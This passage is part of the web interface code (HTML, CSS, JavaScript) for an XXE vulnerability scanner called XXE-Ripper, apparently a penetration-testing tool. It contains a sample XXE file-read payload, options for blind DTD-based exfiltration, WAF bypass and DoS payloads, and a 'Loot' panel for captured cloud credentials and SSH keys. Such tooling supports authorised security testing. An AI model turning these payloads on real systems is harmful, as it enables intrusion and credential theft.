  .f-label .opt{
    color:var(--fg-4);font-weight:400;font-size:10px;
    font-family:var(--mono);
  }
  .f-input,.f-textarea{
    width:100%;background:var(--surface);color:var(--fg);
    border:1px solid var(--line);border-radius:var(--radius-sm);
    padding:8px 10px;font-family:var(--mono);font-size:11.5px;
    transition:border-color .1s, background .1s, box-shadow .1s;
  }
  .f-input:hover,.f-textarea:hover{border-color:var(--line-2)}
  .f-input:focus,.f-textarea:focus{
    border-color:var(--accent-line);background:var(--surface-2);
    box-shadow:0 0 0 3px var(--accent-bg);
  }
  .f-input::placeholder,.f-textarea::placeholder{color:var(--fg-4)}
  .f-textarea{resize:vertical;min-height:60px;line-height:1.55}
  .f-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
  .f-grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}

  .f-check{
    display:flex;align-items:flex-start;gap:9px;
    padding:6px 0;cursor:pointer;user-select:none;
    font-size:11.5px;color:var(--fg-2);transition:color .1s;
  }
  .f-check:hover{color:var(--fg)}
  .f-check input{
    appearance:none;-webkit-appearance:none;
    width:14px;height:14px;flex-shrink:0;margin-top:1px;
    border:1px solid var(--line-3);border-radius:3px;
    background:var(--surface);cursor:pointer;position:relative;
    transition:all .1s;
  }
  .f-check input:checked{
    background:var(--accent-2);border-color:var(--accent-2);
  }
  .f-check input:checked::after{
    content:"";position:absolute;left:3.5px;top:.5px;
    width:4px;height:8px;border:solid #fff;
    border-width:0 1.5px 1.5px 0;transform:rotate(45deg);
  }
  .f-check input:focus-visible{
    box-shadow:0 0 0 3px var(--accent-bg);
  }
  .f-check small{
    display:block;color:var(--fg-4);font-size:10.5px;
    margin-top:2px;line-height:1.45;
  }

  .encoder-grid{
    display:grid;grid-template-columns:1fr 1fr;gap:3px 14px;
    margin-top:8px;padding:10px 12px;
    background:var(--surface);border:1px solid var(--line);
    border-radius:var(--radius-sm);
  }
  .encoder-grid .f-check{padding:4px 0;font-size:11px}
  .encoder-grid .f-check input{width:12px;height:12px}

  .modal-backdrop{
    position:fixed;inset:0;background:rgba(0,0,0,.55);
    display:none;align-items:center;justify-content:center;
    z-index:90;backdrop-filter:blur(3px);
  }
  .modal-backdrop.open{display:flex;animation:fadeIn .12s ease}
  .modal{
    width:400px;max-width:92vw;
    background:var(--surface);border:1px solid var(--line-2);
    border-radius:var(--radius-lg);padding:20px;
    box-shadow:var(--shadow-lg);
    animation:cmdkIn .14s cubic-bezier(.2,.8,.2,1);
  }
  .modal.wide{width:520px}
  .modal h3{
    margin:0 0 12px;font-size:14px;font-weight:600;
    letter-spacing:-.005em;
  }
  .modal p{
    margin:0 0 20px;font-size:12px;color:var(--fg-2);
    line-height:1.55;
  }
  .modal-actions{display:flex;gap:8px;justify-content:flex-end}
  .modal-btn{
    padding:7px 14px;border-radius:var(--radius-sm);
    font-size:12px;font-weight:500;
    background:var(--surface-2);color:var(--fg-2);
    transition:all .08s;
  }
  .modal-btn:hover{background:var(--surface-3);color:var(--fg)}
  .modal-btn.danger{background:var(--crit);color:#fff}
  .modal-btn.danger:hover{background:#e05c60}

  .sc-table{width:100%;border-collapse:collapse;font-size:12px}
  .sc-table tr{border-bottom:1px solid var(--line)}
  .sc-table tr:last-child{border-bottom:0}
  .sc-table td{padding:8px 0;color:var(--fg-2)}
  .sc-table td:first-child{width:160px}
  .sc-group{
    font-size:10px;font-weight:600;letter-spacing:.08em;
    text-transform:uppercase;color:var(--fg-4);
    padding-top:14px !important;padding-bottom:4px !important;
  }
  .sc-group:first-child{padding-top:0 !important}

  .about-logo{
    display:flex;align-items:center;gap:12px;margin-bottom:16px;
  }
  .about-logo svg{width:36px;height:36px;color:var(--accent);
    filter:drop-shadow(0 0 12px rgba(110,168,254,.3))}
  .about-logo .name{font-size:16px;font-weight:600;
    letter-spacing:-.01em}
  .about-logo .ver{
    font-family:var(--mono);font-size:11px;color:var(--fg-3);
    margin-top:2px;
  }
  .about-meta{
    font-size:12px;color:var(--fg-2);line-height:1.7;
  }
  .about-meta strong{color:var(--fg);font-weight:500}
  .about-warn{
    margin-top:16px;padding:10px 12px;
    background:var(--crit-bg);
    border:1px solid rgba(244,113,116,.25);
    border-radius:var(--radius-sm);
    font-size:11.5px;color:var(--crit);line-height:1.5;
  }

  .toasts{
    position:fixed;bottom:36px;right:16px;z-index:95;
    display:flex;flex-direction:column;gap:8px;
    pointer-events:none;
  }
  .toast{
    padding:10px 14px;
    background:var(--surface-2);border:1px solid var(--line-2);
    border-left:3px solid var(--accent);
    border-radius:var(--radius);font-size:12px;color:var(--fg);
    box-shadow:var(--shadow-md);
    animation:toastIn .18s cubic-bezier(.2,.8,.2,1);
    pointer-events:auto;max-width:360px;
    display:flex;align-items:center;gap:10px;
  }
  .toast.ok{border-left-color:var(--ok)}
  .toast.err{border-left-color:var(--crit)}
  @keyframes toastIn{
    from{opacity:0;transform:translateX(20px)}
    to{opacity:1;transform:none}
  }

  .loot-item{
    padding:12px 14px;border-bottom:1px solid var(--line);
  }
  .loot-item:hover{background:var(--surface)}
  .loot-head{
    display:flex;align-items:center;gap:10px;margin-bottom:6px;
  }
  .loot-kind{
    font-family:var(--mono);font-size:9.5px;font-weight:600;
    text-transform:uppercase;letter-spacing:.05em;
    padding:2px 6px;border-radius:3px;
    background:var(--surface-2);color:var(--fg-3);
  }
  .loot-kind-file{color:var(--accent);background:var(--accent-bg)}
  .loot-kind-aws_iam{
    color:var(--crit);background:var(--crit-bg);
  }
  .loot-kind-ssh_private_key{
    color:var(--high);background:var(--high-bg);
  }
  .loot-kind-gcp_service_account{
    color:#c9a3f5;background:rgba(201,163,245,.08);
  }
  .loot-path{
    font-family:var(--mono);font-size:11.5px;color:var(--fg);
    flex:1;overflow:hidden;text-overflow:ellipsis;
    white-space:nowrap;
  }
  .loot-size{
    font-family:var(--mono);font-size:10px;color:var(--fg-4);
  }
  .loot-tech{
    font-family:var(--mono);font-size:10.5px;margin-bottom:6px;
  }
  .loot-pre{
    margin:0;padding:10px 12px;background:var(--bg-1);
    border:1px solid var(--line);border-radius:var(--radius-sm);
    font-family:var(--mono);font-size:10.5px;line-height:1.55;
    color:var(--fg-2);white-space:pre-wrap;word-break:break-word;
    max-height:220px;overflow:auto;
  }
  .loot-creds{
    margin-top:10px;padding:10px 12px;background:var(--bg-1);
    border:1px solid rgba(244,113,116,.25);border-radius:var(--radius-sm);
  }
  .loot-creds-label{
    font-size:10px;font-weight:600;letter-spacing:.06em;
    text-transform:uppercase;color:var(--crit);margin-bottom:8px;
  }
  .loot-cred{
    display:flex;flex-wrap:wrap;gap:8px;align-items:center;
    padding:6px 0;border-bottom:1px solid var(--line);
    font-size:11px;
  }
  .loot-cred:last-child{border-bottom:0}
  .loot-cred-kind{
    font-family:var(--mono);font-size:10px;font-weight:600;
    padding:1.5px 6px;border-radius:3px;
    background:var(--crit-bg);color:var(--crit);
    text-transform:uppercase;letter-spacing:.05em;
  }
  .loot-cred-field{
    font-family:var(--mono);font-size:10.5px;color:var(--fg-3);
  }
  .loot-cred-field b{
    font-weight:500;color:var(--fg-4);margin-right:4px;
    text-transform:uppercase;letter-spacing:.03em;
  }

  @media (max-width:1180px){
    .workbench{grid-template-columns:210px 1fr 380px}
    .ctx-url{max-width:240px}
  }
  @media (max-width:960px){
    .workbench{grid-template-columns:200px 1fr}
    .pane.right{display:none}
    .ctx-url{max-width:180px}
  }
</style>
</head>
<body>

<div class="app">

  <div class="menubar">
    <div class="brand">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 2 3 6v6c0 5 3.5 9.5 9 10 5.5-.5 9-5 9-10V6l-9-4z"/>
        <path d="m9 12 2 2 4-4"/>
      </svg>
      XXE-Ripper
      <span class="ver">v1.0</span>
    </div>

    <div class="menu-trigger" data-menu="file">File</div>
    <div class="menu-trigger" data-menu="scan">Scan</div>
    <div class="menu-trigger" data-menu="view">View</div>
    <div class="menu-trigger" data-menu="help">Help</div>

    <div class="menubar-spacer"></div>
    <div class="menubar-status">
      <span class="dot" id="connDot"></span>
      <span id="connText">connected</span>
    </div>
    <div class="kbd-hint">
      <span class="kbd">⌘</span>
      <span class="kbd">K</span>
    </div>
  </div>

  <div class="toolbar">
    <button class="tb-btn primary" data-cmd="new">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2.5" stroke-linecap="round">
        <line x1="12" y1="5" x2="12" y2="19"/>
        <line x1="5" y1="12" x2="19" y2="12"/>
      </svg>
      New scan
    </button>
    <div class="tb-sep"></div>
    <button class="tb-btn" id="tbStop" disabled data-cmd="stop">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round">
        <rect x="6" y="6" width="12" height="12" rx="1.5"/>
      </svg>
      Stop
    </button>
    <button class="tb-btn" id="tbRerun" disabled data-cmd="rerun">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="23 4 23 10 17 10"/>
        <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
      </svg>
      Re-run
    </button>
    <div class="tb-sep"></div>
    <button class="tb-btn" id="tbJson" disabled data-cmd="export-json">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round">
        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
        <polyline points="7 10 12 15 17 10"/>
        <line x1="12" y1="15" x2="12" y2="3"/>
      </svg>
      JSON
    </button>
    <button class="tb-btn" id="tbSarif" disabled data-cmd="export-sarif">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round">
        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
        <polyline points="7 10 12 15 17 10"/>
        <line x1="12" y1="15" x2="12" y2="3"/>
      </svg>
      SARIF
    </button>
    <button class="tb-btn" id="tbHtml" disabled data-cmd="export-html">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round">
        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
        <polyline points="7 10 12 15 17 10"/>
        <line x1="12" y1="15" x2="12" y2="3"/>
      </svg>
      HTML
    </button>
    <button class="tb-btn" id="tbViewHtml" disabled data-cmd="view-html">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
        <circle cx="12" cy="12" r="3"/>
      </svg>
      View HTML
    </button>
    <div class="toolbar-spacer"></div>
    <div class="sev-toggles" id="sevToggles">
      <button class="sev-btn on" data-sev="CRITICAL" title="Toggle CRITICAL">C</button>
      <button class="sev-btn on" data-sev="HIGH"     title="Toggle HIGH">H</button>
      <button class="sev-btn on" data-sev="MEDIUM"   title="Toggle MEDIUM">M</button>
      <button class="sev-btn on" data-sev="LOW"      title="Toggle LOW">L</button>
      <button class="sev-btn on" data-sev="INFO"     title="Toggle INFO">I</button>
    </div>
    <div class="tb-search">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round">
        <circle cx="11" cy="11" r="7"/>
        <line x1="21" y1="21" x2="16.65" y2="16.65"/>
      </svg>
      <input type="text" id="tbFilter" placeholder="filter findings…">
    </div>
    <button class="tb-icon" id="tbDensity" title="Toggle density">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round">
        <line x1="4" y1="6" x2="20" y2="6"/>
        <line x1="4" y1="12" x2="20" y2="12"/>
        <line x1="4" y1="18" x2="20" y2="18"/>
      </svg>
    </button>
  </div>

  <div class="contextbar" id="contextBar" style="display:none">
    <div class="ctx-status">
      <span class="ctx-dot" id="ctxDot"></span>
      <span class="ctx-url" id="ctxUrl">—</span>
      <span class="ctx-pill" id="ctxPill">—</span>
    </div>
    <div class="ctx-spacer"></div>
  </div>

  <div class="workbench" id="workbench">
    <aside class="pane left">
      <div class="pane-header">
        Targets
        <span class="count" id="targetsCount"></span>
      </div>
      <div class="pane-body" id="targetsBody">
        <div class="empty">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
               stroke-width="1.5">
            <rect x="3" y="3" width="18" height="18" rx="2"/>
            <path d="M3 9h18M9 21V9"/>
          </svg>
          <strong>No targets</strong>
          <span>Start a scan to see results here</span>
          <span class="hint">⌘K → New scan</span>
        </div>
      </div>
    </aside>

    <section class="pane center">
      <div class="pane-tabs" id="centerTabs">
        <button class="ptab active" data-tab="findings">
          Findings <span class="ptab-count" id="cntFindings">0</span>
        </button>
        <button class="ptab" data-tab="events">
          Events <span class="ptab-count" id="cntEvents">0</span>
        </button>
        <button class="ptab" data-tab="oob">
          OOB <span class="ptab-count" id="cntOob">0</span>
        </button>
        <button class="ptab" data-tab="loot">
          Loot <span class="ptab-count" id="cntLoot">0</span>
        </button>
        <button class="ptab" data-tab="log">Log</button>
      </div>
      <div class="pane-body" id="centerBody">
        <div class="empty">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
               stroke-width="1.5">
            <circle cx="11" cy="11" r="7"/>
            <line x1="21" y1="21" x2="16.65" y2="16.65"/>
          </svg>
          <strong>Select a target</strong>
          <span>Findings will appear here as the scan runs</span>
        </div>
      </div>
    </section>

    <aside class="pane right">
      <div class="pane-header">Inspector</div>
      <div class="insp-tabs" id="inspTabs" style="display:none">
        <button class="itab active" data-tab="overview">Overview</button>
        <button class="itab" data-tab="evidence">Evidence</button>
        <button class="itab" data-tab="reasons">Reasons</button>
        <button class="itab" data-tab="raw">Raw</button>
      </div>
      <div class="insp-body" id="inspBody">
        <div class="empty" style="padding-top:60px">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
               stroke-width="1.5">
            <circle cx="11" cy="11" r="7"/>
            <line x1="21" y1="21" x2="16.65" y2="16.65"/>
          </svg>
          <strong>No selection</strong>
          <span>Select a finding to inspect its details</span>
        </div>
      </div>
    </aside>
  </div>

  <div class="statusbar">
    <span class="sb-item"><b id="sbTargets">0</b> targets</span>
    <span class="sb-item"><b id="sbFindings">0</b> findings</span>
    <span class="sb-item crit"><b id="sbCrit">0</b> critical</span>
    <span class="sb-item high"><b id="sbHigh">0</b> high</span>
    <span class="sb-item"><b id="sbLoot">0</b> loot</span>
    <span class="statusbar-spacer"></span>
    <span class="sb-item phase" id="sbPhase" style="display:none">
      <b>phase: <span id="sbPhaseName">—</span></b>
    </span>
    <span class="sb-item" id="sbElapsed" style="display:none">
      <b><span id="sbElapsedN">0</span>s</b>
    </span>
  </div>

</div>

<div class="cmdk-backdrop" id="cmdkBackdrop">
  <div class="cmdk" onclick="event.stopPropagation()">
    <div class="cmdk-input">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round">
        <circle cx="11" cy="11" r="7"/>
        <line x1="21" y1="21" x2="16.65" y2="16.65"/>
      </svg>
      <input type="text" id="cmdkInput" autocomplete="off" spellcheck="false"
             placeholder="Search commands, findings, targets…">
      <span class="kbd">esc</span>
    </div>
    <div class="cmdk-list" id="cmdkList"></div>
  </div>
</div>

<div class="drawer-backdrop" id="drawerBackdrop">
  <div class="drawer" onclick="event.stopPropagation()">
    <div class="drawer-head">
      <svg class="lead" viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" stroke-linecap="round">
        <line x1="12" y1="5" x2="12" y2="19"/>
        <line x1="5" y1="12" x2="19" y2="12"/>
      </svg>
      New scan
      <button class="close" id="drawerClose" title="Close">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="2.5" stroke-linecap="round">
          <line x1="18" y1="6" x2="6" y2="18"/>
          <line x1="6" y1="6" x2="18" y2="18"/>
        </svg>
      </button>
    </div>
    <div class="drawer-body">
      <div class="f-section">Target</div>
      <div class="f-group">
        <label class="f-label">URL(s)
          <span class="opt">one per line for batch</span></label>
        <textarea class="f-textarea" id="url" rows="3"
                  placeholder="https://target.com/api/xml"></textarea>
      </div>
      <div class="f-group">
        <label class="f-label">Burp request
          <span class="opt">overrides URL</span></label>
        <textarea class="f-textarea" id="burpRequest" rows="6"
          style="font-size:10.5px"
          placeholder="POST /api/xml HTTP/1.1&#10;Host: target.com&#10;Content-Type: application/xml&#10;&#10;&lt;?xml ..."></textarea>
      </div>
      <div class="f-group">
        <label class="f-label">Pre-auth requests
          <span class="opt">replayed once before the scan; blank line
            between multiple requests</span></label>
        <textarea class="f-textarea" id="preAuthRequests" rows="5"
          style="font-size:10.5px"
          placeholder="POST /login HTTP/1.1&#10;Host: target.com&#10;Content-Type: application/x-www-form-urlencoded&#10;Content-Length: 33&#10;&#10;username=admin&amp;password=hunter2"></textarea>
      </div>

      <div class="f-section">OOB channel</div>
      <div class="f-group">
        <label class="f-label">OOB domain
          <span class="opt">manual mode</span></label>
        <input type="text" class="f-input" id="oob" placeholder="c5f2…oast.pro">
      </div>
      <label class="f-check">
        <input type="checkbox" id="oob_auto">
        <span>Auto OOB mode
          <small>Spawn interactsh-client and correlate callbacks.
            Domain field is ignored.</small></span>
      </label>
      <div class="f-group" id="oobTimeoutGroup"
           style="display:none;margin-top:10px">
        <label class="f-label">OOB poll timeout
          <span class="opt">seconds</span></label>
        <input type="number" class="f-input" id="oob_timeout"
               value="8" min="2" step="1">
      </div>

      <div class="f-section">Blind exfiltration</div>
      <label class="f-check">
        <input type="checkbox" id="oob_dtd_use_webui">
        <span>Serve DTDs from this WebUI
          <small>The scanner writes DTDs into the WebUI's own routes.
            No second process. The target must be able to reach the
            WebUI's address.</small></span>
      </label>
      <div class="f-group" id="oobDtdWebuiGroup"
           style="display:none;margin-top:10px">
        <label class="f-label">WebUI public URL
          <span class="opt">the address the target reaches</span></label>
        <input type="text" class="f-input" id="oob_dtd_webui_url"
               placeholder="http://your-server:8080">
      </div>

      <p style="font-size:11px;color:var(--fg-3);margin:14px 0 8px;
                line-height:1.55">
        Or serve DTDs from your own web server. Point the scanner at a
        directory it can write to, and enter the public URL where that
        directory is served.
      </p>
      <div class="f-group">
        <label class="f-label">DTD directory
          <span class="opt">scanner writes DTD files here</span></label>
        <input type="text" class="f-input" id="oob_dtd_dir"
               placeholder="/var/www/dtds">
      </div>
      <div class="f-group">
        <label class="f-label">DTD URL prefix
          <span class="opt">public URL of that directory</span></label>
        <input type="text" class="f-input" id="oob_dtd_url_prefix"
               placeholder="http://198.51.100.7:8000/dtds">
      </div>

      <div class="f-section">Session</div>
      <div class="f-group">
        <label class="f-label">Proxy <span class="opt">optional</span></label>
        <input type="text" class="f-input" id="proxy"
               placeholder="http://127.0.0.1:8080">
      </div>
      <div class="f-group">
        <label class="f-label">Cookie header</label>
        <input type="text" class="f-input" id="cookie"
               placeholder="session=abc; token=xyz">
      </div>
      <div class="f-group">
        <label class="f-label">Cookie file
          <span class="opt">Netscape or name=value</span></label>
        <input type="file" class="f-input" id="cookieFile" accept=".txt">
      </div>

      <div class="f-section">Tuning</div>
      <div class="f-grid">
        <div class="f-group">
          <label class="f-label">Rate <span class="opt">req/s</span></label>
          <input type="number" class="f-input" id="rate" value="0"
                 min="0" step="0.5">
        </div>
        <div class="f-group">
          <label class="f-label">Budget <span class="opt">sec</span></label>
          <input type="number" class="f-input" id="budget" value="600"
                 min="10" step="10">
        </div>
      </div>
      <div class="f-grid-3">
        <div class="f-group">
          <label class="f-label">Connect <span class="opt">sec</span></label>
          <input type="number" class="f-input" id="timeout_connect"
                 value="5" min="1">
        </div>
        <div class="f-group">
          <label class="f-label">Read <span class="opt">sec</span></label>
          <input type="number" class="f-input" id="timeout_read"
                 value="15" min="1">
        </div>
        <div class="f-group">
          <label class="f-label">Threads</label>
          <input type="number" class="f-input" id="threads"
                 value="4" min="1" max="64">
        </div>
      </div>

      <div class="f-section">Payloads</div>
      <div class="f-group">
        <label class="f-label">Custom payloads
          <span class="opt">one per line</span></label>
        <textarea class="f-textarea" id="payloads"
          placeholder='&lt;!DOCTYPE x [&lt;!ENTITY e SYSTEM "file://{FILE}"&gt;]&gt;&lt;x&gt;&amp;e;&lt;/x&gt;'></textarea>
      </div>
      <div class="f-group">
        <label class="f-label">Payload files
          <span class="opt">.xml / .txt / .payload</span></label>
        <input type="file" class="f-input" id="payloadFiles" multiple
               accept=".xml,.txt,.payload">
      </div>

      <div class="f-section">Scan options</div>
      <label class="f-check"><input type="checkbox" id="timing">
        <span>Timing-based blind detection
          <small>Uses response latency to infer blind XXE</small></span>
      </label>
      <label class="f-check"><input type="checkbox" id="svg">
        <span>Force SVG upload phase</span>
      </label>
      <label class="f-check"><input type="checkbox" id="saml">
        <span>Force SAML pre-signature phase</span>
      </label>
      <label class="f-check"><input type="checkbox" id="full_file_scan">
        <span>Full file-target scan
          <small>~50 probes instead of ~20</small></span>
      </label>
      <label class="f-check"><input type="checkbox" id="no_fingerprint">
        <span>Skip fingerprint phase</span>
      </label>
      <label class="f-check"><input type="checkbox" id="unsafe">
        <span>Enable DoS payloads</span>
      </label>
      <label class="f-check"><input type="checkbox" id="verify_tls">
        <span>Verify TLS certificates</span>
      </label>
      <label class="f-check"><input type="checkbox" id="debug">
        <span>Debug logging</span>
      </label>

      <div class="f-section">WAF bypass</div>
      <label class="f-check"><input type="checkbox" id="bypass_waf">
        <span>Enable WAF bypass phase
          <small>Re-send every payload through selected encoders</small>
        </span>
      </label>
      <div id="wafPanel" style="display:none;margin-top:10px">
        <div style="display:flex;align-items:center;
                    justify-content:space-between;margin-bottom:8px">
          <span class="f-label" style="margin:0">Encoders</span>
          <button class="tb-btn bordered" id="wafToggleAll"
                  style="font-size:10.5px;padding:4px 9px">Toggle all</button>
        </div>
        <div class="encoder-grid" id="encoderGrid"></div>
        <label class="f-check" style="margin-top:10px">
          <input type="checkbox" id="bypass_waf_include_custom">
          <span>Also encode custom payloads
            <small>Skips customs using {CALLBACK} / {DOMAIN}</small></span>
        </label>
      </div>
    </div>
    <div class="drawer-foot">
      <button class="modal-btn" id="drawerCancel">Cancel</button>
      <button class="tb-btn primary" id="drawerLaunch"
              style="padding:7px 16px">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="2.5" stroke-linecap="round">
          <polygon points="6 3 20 12 6 21 6 3" fill="currentColor"/>
        </svg>
        Start scan
      </button>
    </div>
  </div>
</div>

<div class="modal-backdrop" id="modalBackdrop">
  <div class="modal">
    <h3 id="modalTitle">Confirm</h3>
    <p id="modalMsg"></p>
    <div class="modal-actions">
      <button class="modal-btn" id="modalCancel">Cancel</button>
      <button class="modal-btn danger" id="modalConfirm">Confirm</button>
    </div>
  </div>
</div>

<div class="modal-backdrop" id="shortcutsBackdrop">
  <div class="modal wide">
    <h3>Keyboard shortcuts</h3>
    <table class="sc-table">
      <tr><td class="sc-group" colspan="2">Navigation</td></tr>
      <tr><td><span class="kbd">j</span></td><td>Next target</td></tr>
      <tr><td><span class="kbd">k</span></td><td>Previous target</td></tr>
      <tr><td><span class="kbd">n</span></td><td>Next finding</td></tr>
      <tr><td><span class="kbd">p</span></td><td>Previous finding</td></tr>
      <tr><td><span class="kbd">Esc</span></td><td>Progressive dismiss (filter → finding → target)</td></tr>
      <tr><td class="sc-group" colspan="2">Actions</td></tr>
      <tr><td><span class="kbd">⌘</span> <span class="kbd">K</span></td><td>Command palette</td></tr>
      <tr><td><span class="kbd">c</span></td><td>New scan</td></tr>
      <tr><td><span class="kbd">r</span></td><td>Re-run selected scan</td></tr>
      <tr><td><span class="kbd">/</span></td><td>Focus filter</td></tr>
      <tr><td><span class="kbd">?</span></td><td>This dialog</td></tr>
    </table>
    <div class="modal-actions" style="margin-top:18px">
      <button class="modal-btn" id="shortcutsClose">Close</button>
    </div>
  </div>
</div>

<div class="modal-backdrop" id="aboutBackdrop">
  <div class="modal">
    <div class="about-logo">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 2 3 6v6c0 5 3.5 9.5 9 10 5.5-.5 9-5 9-10V6l-9-4z"/>
        <path d="m9 12 2 2 4-4"/>
      </svg>
      <div>
        <div class="name">XXE-Ripper WebUI</div>
        <div class="ver">v1.0 · standalone black-box XXE scanner</div>
      </div>
    </div>
    <div class="about-meta">
      <div><strong>Detection families:</strong> in-band, error-based,
        blind OOB, encoding bypass, alternative sinks, extended
        fetchers</div>
      <div style="margin-top:8px"><strong>Output:</strong> JSON ·
        SARIF 2.1.0</div>
      <div style="margin-top:8px"><strong>CWE coverage:</strong>
        611, 200, 918, 78, 776, 829, 347, 693</div>
    </div>
    <div class="about-warn">
      Authorized testing only. This tool sends real exploit payloads
      against the target.
    </div>
    <div class="modal-actions" style="margin-top:18px">
      <button class="modal-btn" id="aboutClose">Close</button>
    </div>
  </div>
</div>

<div class="toasts" id="toastWrap"></div>

<script>
"use strict";

// =================================================================
// State
// =================================================================
const state = {
  jobs: [],
  selectedJobId: null,
  selectedFindingId: null,
  findings: [],
  events: [],
  oob: [],
  loot: [],
  logs: [],
  activeSevs: new Set(["CRITICAL","HIGH","MEDIUM","LOW","INFO"]),
  filter: "",
  sort: { key: "severity", dir: "desc" },
  centerTab: "findings",
  inspTab: "overview",
  density: localStorage.getItem("xxe.density") || "comfortable",
  defaults: JSON.parse(localStorage.getItem("xxe.defaults") || "{}"),
};

const $ = id => document.getElementById(id);

// =================================================================
// Utilities
// =================================================================
function esc(s){
  return String(s == null ? "" : s).replace(/[&<>"']/g, c => ({
    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
  })[c]);
}
function b64enc(s){
  const bytes = new TextEncoder().encode(String(s));
  let bin = ""; bytes.forEach(b => bin += String.fromCharCode(b));
  return btoa(bin);
}
function b64dec(b){
  const bin = atob(b);
  const bytes = new Uint8Array(bin.length);
  for (let i=0;i<bin.length;i++) bytes[i] = bin.charCodeAt(i);
  return new TextDecoder().decode(bytes);
}
function fmtTime(ts){
  if (!ts) return "—";
  return new Date(ts*1000).toLocaleTimeString([], {
    hour:"2-digit", minute:"2-digit", second:"2-digit"
  });
}
function relTime(ts){
  if (!ts) return "";
  const s = Math.floor(Date.now()/1000 - ts);
  if (s < 5) return "just now";
  if (s < 60) return s + "s ago";
  if (s < 3600) return Math.floor(s/60) + "m ago";
  if (s < 86400) return Math.floor(s/3600) + "h ago";
  return Math.floor(s/86400) + "d ago";
}
async function copyText(text){
  try { await navigator.clipboard.writeText(text); return true; }
  catch(e){
    const ta = document.createElement("textarea");
    ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
    document.body.appendChild(ta); ta.select();
    let ok = false;
    try { ok = document.execCommand("copy"); } catch(e2){}
    document.body.removeChild(ta);
    return ok;
  }
}
function toast(msg, kind){
  const t = document.createElement("div");
  t.className = "toast" + (kind ? " " + kind : "");
  t.innerHTML = `<span>${esc(msg)}</span>`;
  $("toastWrap").appendChild(t);
  setTimeout(() => {
    t.style.transition = "opacity .2s, transform .2s";
    t.style.opacity = "0";
    t.style.transform = "translateX(12px)";
    setTimeout(() => t.remove(), 220);
  }, 2800);
}
function readFileAsText(file){
  return new Promise((resolve, reject) => {
    const r = new FileReader();
    r.onload  = () => resolve(String(r.result || ""));
    r.onerror = () => reject(r.error);
    r.readAsText(file, "utf-8");
  });
}

// =================================================================
// Dropdown menu system
// =================================================================
const MENUS = {
  file: {
    label: "File",
    items: [
      { id:"new", label:"New scan…", kbd:"C" },
      { sep:true },
      { id:"export-json", label:"Export as JSON…",
        disabled: () => !state.selectedJobId },
      { id:"export-sarif", label:"Export as SARIF…",
        disabled: () => !state.selectedJobId },
      { id:"export-html", label:"Download HTML report…",
        disabled: () => !state.selectedJobId },
      { id:"view-html", label:"View HTML report",
        disabled: () => !state.selectedJobId },
      { sep:true },
      { id:"close-detail", label:"Close detail", kbd:"Esc",
        disabled: () => !state.selectedJobId },
    ]
  },
  scan: {
    label: "Scan",
    items: [
      { id:"rerun", label:"Re-run scan", kbd:"R",
        disabled: () => !state.selectedJobId },
      { id:"stop", label:"Stop scan",
        disabled: () => {
          if (!state.selectedJobId) return true;
          const job = state.jobs.find(j => j.id === state.selectedJobId);
          return !job || job.status !== "running";
        } },
      { sep:true },
      { id:"opt-timing", label:"Timing-based blind detection",
        check: () => state.defaults.timing === true },
      { id:"opt-svg", label:"Force SVG upload phase",
        check: () => state.defaults.svg === true },
      { id:"opt-saml", label:"Force SAML pre-signature phase",
        check: () => state.defaults.saml === true },
      { id:"opt-full", label:"Full file-target scan",
        check: () => state.defaults.full_file_scan === true },
      { id:"opt-unsafe", label:"Enable DoS payloads",
        check: () => state.defaults.unsafe === true },
      { id:"opt-debug", label:"Debug logging",
        check: () => state.defaults.debug === true },
    ]
  },
  view: {
    label: "View",
    items: [
      { id:"view-density", label:"Compact density",
        check: () => state.density === "compact" },
      { sep:true },
      { id:"view-focus-filter", label:"Focus filter", kbd:"/" },
      { id:"view-clear-filter", label:"Clear filter",
        disabled: () => !state.filter },
      { sep:true },
      { id:"view-show-all", label:"Show all severities" },
      { id:"view-crit-only", label:"Show CRITICAL only" },
      { id:"view-crit-high", label:"Show CRITICAL + HIGH only" },
      { id:"view-hide-info", label:"Hide INFO" },
    ]
  },
  help: {
    label: "Help",
    items: [
      { id:"help-shortcuts", label:"Keyboard shortcuts…" },
      { id:"help-about", label:"About XXE-Ripper" },
    ]
  }
};

let openMenu = null;

function buildMenus(){
  document.querySelectorAll(".menu-trigger").forEach(trig => {
